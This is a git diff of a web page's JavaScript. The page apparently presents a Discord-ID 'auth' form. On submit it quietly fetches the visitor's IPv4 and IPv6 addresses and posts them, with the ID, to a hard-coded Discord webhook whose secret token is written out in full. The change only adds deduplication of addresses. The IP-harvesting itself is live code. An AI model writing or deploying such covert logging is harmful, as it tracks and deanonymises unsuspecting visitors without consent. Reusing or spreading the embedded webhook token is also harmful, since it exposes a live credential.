@@ -16,13 +16,18 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   const authForm = document.getElementById('auth-form');
+  const allowedIPs = [];
+
   authForm.addEventListener('submit', async (event) => {
     event.preventDefault();
     const discordID = document.getElementById('discord-id').value;
 
     const ipData = await getIPAddresses();
 
-    sendToWebhook(discordID, ipData.ipv4, ipData.ipv6);
+    if (!allowedIPs.includes(ipData.ipv4)) {
+      allowedIPs.push(ipData.ipv4); 
+      sendToWebhook(discordID, ipData.ipv4, ipData.ipv6);
+    }
 
     authForm.style.display = 'none';
     document.querySelector('header').style.display = 'block';
@@ -40,7 +45,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   function sendToWebhook(discordID, ipv4, ipv6) {
-    const webhookURL = 'https://discord.com/api/webhooks/1290225314022031402/7JCLF2tHFCNnmAO-7xZ1UtQbOJILBkclyGfxt3KYI7buXWMvV-ND6_607i6WzdeJ2Ycy'; 
+    const webhookURL = 'https://discord.com/api/webhooks/1290225314022031402/7JCLF2tHFCNnmAO-7xZ1UtQbOJILBkclyGfxt3KYI7buXWMvV-ND6_607i6WzdeJ2Ycy';
     const payload = {
       content: `Discord ID: ${discordID}\nIPv4: ${ipv4}\nIPv6: ${ipv6}`
     };
